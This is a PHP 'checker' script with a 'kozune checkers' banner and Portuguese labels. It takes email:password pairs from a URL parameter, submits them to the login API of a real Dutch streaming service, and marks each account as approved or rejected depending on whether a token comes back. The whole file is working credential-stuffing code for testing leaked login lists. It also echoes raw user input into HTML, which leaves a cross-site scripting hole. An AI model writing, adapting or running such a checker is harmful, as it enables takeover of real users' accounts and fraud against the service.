<?php
/*
  _                                      
 | |                                                                          
 | | _____ _____   _ _ __   ___          
 | |/ / _ \_  / | | | '_ \ / _ \         
 |   < (_) / /| |_| | | | |  __/         
 |_|\_\___/___|\__,_|_|_|_|\___|         
      | |             | |                
   ___| |__   ___  ___| | _____ _ __ ___ 
  / __| '_ \ / _ \/ __| |/ / _ \ '__/ __|
 | (__| | | |  __/ (__|   <  __/ |  \__ \
  \___|_| |_|\___|\___|_|\_\___|_|  |___/
                                         
                                         
*/
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($string)
{
    $delimiters = array(
        "|",
        ";",
        ":",
        "/",
        "»",
        "«",
        ">",
        "<"
    );
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista) [0];
$senha = multiexplode($lista) [1];

$linkprincipal = "https://api.cinetree.nl/login";

$headers = array();
$header_cinetree = array(
    'Content-Type: application/json'
);

$result = curl_init();
curl_setopt($result, CURLOPT_URL, $linkprincipal);
curl_setopt($result, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($result, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($result, CURLOPT_POSTFIELDS, "{\"username\":\"" . $email . "\",\"password\":\"" . $senha . "\"}");
curl_setopt($result, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($result, CURLOPT_HTTPHEADER, $header_cinetree);

echo $result = curl_exec($result);
if (strpos($result, 'token'))
{
    echo "<div class='badge badge-success'>#Aprovada</div> <b class='badge badge-primary'>CONTA: $lista</b><span class='badge badge-primary'>@kozune</span></p>";
}
else
{
    echo "<div class='badge badge-danger'>#REPROVADA</div> <b class='badge badge-primary'>CONTA: $lista</b> <span class='badge badge-light'>@kozune</span></p>";
}
?>
